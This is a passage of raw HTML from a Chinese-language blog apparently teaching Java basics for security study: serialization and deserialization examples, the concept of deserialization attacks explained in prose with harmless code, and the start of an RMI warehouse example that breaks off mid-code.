class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// printf() 中字符串需要引号</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> Java 的 Hello World<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从上面可以看出，Java 的 main 方法前缀太长了。</p><p>Java 的一切皆对象的思想贯穿 Java 的整个语言生态，Hello world 也必须要使用类相关的思想。</p><p>在面向对象中，所有的函数都必须要使用访问修饰符来进行修饰，这里的 main 必须是共有才能被外部所调用。</p><p>如果把函数成员声明为静态的，就可以把函数与类的任何特定对象独立开来。也就是 <code>static</code> 修饰符可以让 main 函数不用创建对象就能被调用（不会违反类的基本特性）。</p><p><code>string[] args</code> 就是 Java 中规定的，必须要遵守的，都需要传参。</p><h2 id="0x06-Java-如何反序列化？"><a href="#0x06-Java-如何反序列化？" class="headerlink" title="0x06 Java 如何反序列化？"></a>0x06 Java 如何反序列化？</h2><p>对象序列化是指将「内存中保存的对象」以二进制数据流的形式进行处理以便实现对象的传输或储存。摘录一段廖雪峰对于序列化的描述：</p><blockquote><p>序列化是指把一个 <strong>Java 对象变成二进制内容</strong>，二进制本质上就是一个 byte[] 数组。<br>为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。</p></blockquote><p>Java 的序列化机制仅适用于 Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如 JSON。不过，JSON只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。</p><p>序列化步骤：</p><ol><li>基本类型，如int，boolean，String（以UTF-8编码）可以使用 <code>ObjectOutputStream.writeObject</code> 函数直接序列化。</li><li>Java 类需要实现 Serializable 接口</li></ol><p>反序列化步骤：</p><ol><li>使用 <code>ObjectInputStream.readObject</code> 函数进行反序列化</li></ol><p>下面是一段简单的代码演示如何进行Java对象的序列化以及反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//可以被序列化的Person类</span></span><br><span class="line"><span class="comment">//如果加上transient关键字的话序列化时会忽略这个属性</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">* 创建人的对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> age  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;姓名: &quot;</span> + name + <span class="string">&quot;、年龄: &quot;</span> + age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 所谓的序列化就是二进制数据流的处理</span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: Baby_Serializable  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Author</span>: flo@t</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Baby_Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> File SAVE_FILE = <span class="keyword">new</span> File(<span class="string">&quot;serial.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 序列化和反序列化的操作可由ObjectOutputStream和ObjectInputStream两个类来实现</span></span><br><span class="line"><span class="comment">* ObjectOutputStream: 是OutputStream子类，接受一个OutputStream类对象</span></span><br><span class="line"><span class="comment">* ObjectInputStream: 是InputStream子类，接受一个InputStream类对象</span></span><br><span class="line"><span class="comment">* 序列化方法：writeObject()</span></span><br><span class="line"><span class="comment">* 反序列化方法：readObject()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">saveObject(<span class="keyword">new</span> Person(<span class="string">&quot;小米&quot;</span>, <span class="number">18</span>));<span class="comment">//序列化</span></span><br><span class="line">System.out.println(loadObject());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(SAVE_FILE));</span><br><span class="line">os.writeObject(obj);  <span class="comment">//序列化</span></span><br><span class="line">os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(SAVE_FILE));</span><br><span class="line">Object obj = ois.readObject();<span class="comment">//反序列化</span></span><br><span class="line">ois.close();</span><br><span class="line"><span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-如何利用-Java-反序列化进行攻击？"><a href="#0x07-如何利用-Java-反序列化进行攻击？" class="headerlink" title="0x07 如何利用 Java 反序列化进行攻击？"></a>0x07 如何利用 Java 反序列化进行攻击？</h2><p>在 PHP 和 Python 中在反序列化和序列化时都会有魔法方法进行调用。那 Java 中有哪些“魔法方法”？</p><ul><li><strong>writeObject</strong>：序列化时调用。</li><li>writeReplace：允许开发者提供一个替代对象来取代原来将被序列化的对象。</li><li>readObjectNoData：如果我们希望当接到的序列化流不满足我们想反序列化的类的时候，能自动进行一些状态初始化，那么我们就要提供 readObjectNoData 方法</li><li><strong>readObject</strong>：反序列化时调用。</li><li>readResolve：用来在反序列化的时候用你选择的对象来替代原本反序列化出来的对象。</li><li>validateObject：对某些字段进行校验，validateObject 方法会在我们在 readObject 方法里调用。</li></ul><p>常见的魔法方法为 writeObject 和 readObject，如果黑客将恶意代码嵌入 readObject 方法中，再将序列化后的代码发送给服务器，就会导致服务器在反序列化的过程中执行恶意代码。</p><blockquote><p>注意⚠️：反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行。  </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 自定义的序列化与反序列化操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span> Defined_Serializable.java  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> io_Opt  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年9月3日  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="keyword">package</span> io_Opt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String brand;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> cost;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> brand</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> cost</span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Car</span><span class="params">(String brand, <span class="keyword">int</span> cost)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line"><span class="keyword">this</span>.brand = brand;</span><br><span class="line"><span class="keyword">this</span>.cost = cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;品牌: &quot;</span> + brand + <span class="string">&quot;、售价: &quot;</span> + cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">in.defaultReadObject();</span><br><span class="line">System.out.println(<span class="string">&quot;Read Object Over&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">out.defaultWriteObject();</span><br><span class="line">System.out.println(<span class="string">&quot;Write Object Over&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 进行自定义的Java序列化与反序列化</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: Baby_Serializable  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: flo@t</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Defined_Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> File SAVE_FILE = <span class="keyword">new</span> File(<span class="string">&quot;serial.Car&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Car car = <span class="keyword">new</span> Car(<span class="string">&quot;奔驰&quot;</span>, <span class="number">200000</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(car.toString());</span><br><span class="line"></span><br><span class="line">saveObject(car);</span><br><span class="line"></span><br><span class="line">Car myCar = (Car) loadObject();</span><br><span class="line">System.out.println(myCar.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(SAVE_FILE));</span><br><span class="line">os.writeObject(obj);  <span class="comment">//序列化</span></span><br><span class="line">os.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">loadObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(SAVE_FILE));</span><br><span class="line">Object obj = ois.readObject();<span class="comment">//反序列化</span></span><br><span class="line">ois.close();</span><br><span class="line"><span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-File-对象和-ByteArrayOutputStream-对象的区别与联系"><a href="#0x08-File-对象和-ByteArrayOutputStream-对象的区别与联系" class="headerlink" title="0x08 File 对象和 ByteArrayOutputStream 对象的区别与联系"></a>0x08 File 对象和 ByteArrayOutputStream 对象的区别与联系</h2><p>在反序列化前，通常会创建 ByteArrayOutputStream 类或者 File 类来存储序列化后的数据。</p><p>ByteArrayOutputStream 是一种 Java 字节型输出流。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210327173652.png"><br>（图片说明：Java 中的 IO 流思维导图）</p><p>ByteArrayOutputStream 既然是输出流，为什么在运行时没有创建文件呢？我查看了一下这个类的源码，原来这个类在初始化时，创建了一个长度为 32 的 byte[] 数组。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210327174709.png"><br>（图片说明：ByteArrayOutputStream 的构造函数）</p><p>OutputStream 并非像文章《<a href="https://www.javazhiyin.com/46874.html">你真的会用Java io流吗？</a>》所说的那样：</p><blockquote><p>将数据从外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。</p></blockquote><p>我认为输入流和输出流只相当于一个通道，输入流堵住了出口，输出流堵住了入口，和存储方式没有关系。（那篇文章挺通熟易懂的，建议阅读）输出流类可以作为一个二进制数组保存相关的数据作为中转。</p><p>File类是用来操作文件和目录的，主要是将二进制数据写入文件，真正保存二进制数据的是FileOutputStream类和ByteArrayOutputStream类。</p><h2 id="0x09-java中extends和implements的区别"><a href="#0x09-java中extends和implements的区别" class="headerlink" title="0x09 java中extends和implements的区别"></a>0x09 java中extends和implements的区别</h2><p>一个是继承，一个是实现接口。</p><p>继承这个可以理解为继承父类的方法，父类中的方法可以在子类中用到，super()。</p><p>实现接口就是在接口中定义了方法，这个方法要你自己去实现，接口可以看作一个标准，比如定义了一个动物的接口，它里面有吃（eat()）这个方法，你就可以实现这个方法implements，这个方法是自己写，可以是吃苹果，吃梨子，香蕉，或者其他的。IMPLEMENTS就是具体实现这个接口。</p><h1 id="2-网络编程"><a href="#2-网络编程" class="headerlink" title="2 网络编程"></a>2 网络编程</h1><h2 id="0x01-RMI-是什么？"><a href="#0x01-RMI-是什么？" class="headerlink" title="0x01 RMI 是什么？"></a>0x01 RMI 是什么？</h2><p>RMI 是 Remote Method Invocation 的缩写，也就是远程方法调用，是一种运行机制。</p><p>远程方法调用 RMI（Remote Method Invocation），是允许运行在一个Java 虚拟机的对象调用运行在另一个 Java 虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p><p>与 RMI 非常相似的还有 RPC（Remote Process Call），即远程过程调用。</p><ul><li>RMI：调用另一台计算机上 JVM 中的方法。只适用于 Java，无法跨语言。<strong>是 JDK 1.2 引入的一套 Java 自带 RPC 实现方案。</strong>。（简而言之，RMI 是一种 RPC）</li><li>RPC：调用另一台计算机上的服务（具体的程序）。是网络服务协议，与操作系统和语言无关。</li></ul><p>执行流程：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210325170241.png"></p><ul><li>Registry（注册表）是放置所有服务器对象的命名空间。 每次服务端创建一个对象时，它都会使用 bind() 或 rebind() 方法注册该对象。 这些是使用称为绑定名称的唯一名称注册的。</li><li>要调用远程对象，客户端需要该对象的引用。即通过服务端绑定的名称从注册表中获取对象（lookup() 方法。</li></ul><p>实现RMI：</p><ol><li>Warehouse.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: Warehouse.java</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 仓库的远程接口。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年8月25日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: Warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 远程服务的接口定义中必须要继承Remote接口。这个接口中啥方法都没定义，应该是表示一种能力</span></span><br><span class="line"><span class="comment"> * 官方描述：</span></span><br><span class="line"><span class="comment"> *  ......Any object that is a remote object must directly or indirectly implement this interface.....</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Warehouse</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 用于查询指定商品的价格</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@Title</span>: getPrice</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> description</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> RemoteException</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">double</span> <span class="title">getPrice</span><span class="params">(String description)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>WarehouseImpl.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: WarehouseImpl.java</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span> warehouse</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 服务器端来实现在远程接口中声明的工作。该类是远程方法调用的目标，因为扩展了UnicastRemoteObject类。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019年8月25日</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> V1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实现 remote Warehouse的接口。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: WarehouseImpl</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 补充：RMI的一个特点是服务的接口定义和其实现是分开的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject类的定义：</span></span><br><span class="line"><span class="comment"> * public class UnicastRemoteObject extends RemoteServer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * public abstract class RemoteServer extends RemoteObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * public abstract class RemoteObject implements Remote, java.io.Serializable</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Warehouse</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 定义一个键值对集合用于存放商品价格及其他信息</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> Map&lt;String, Double&gt; prices;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 构造方法</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">WarehouseImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个Map对象并存入存入数据</span></span><br><span class="line">    prices = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    prices.put(<span class="string">&quot;Toaster&quot;</span>, <span class="number">24.5</span>);</span><br><span class="line">    prices.put(<span class="string">&quot;water&quot;</span>, <span class="number">2.0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 接受用户要查询的商品的名称，返回商品的价格</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getPrice</span><span class="params">(String description)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    Double price = 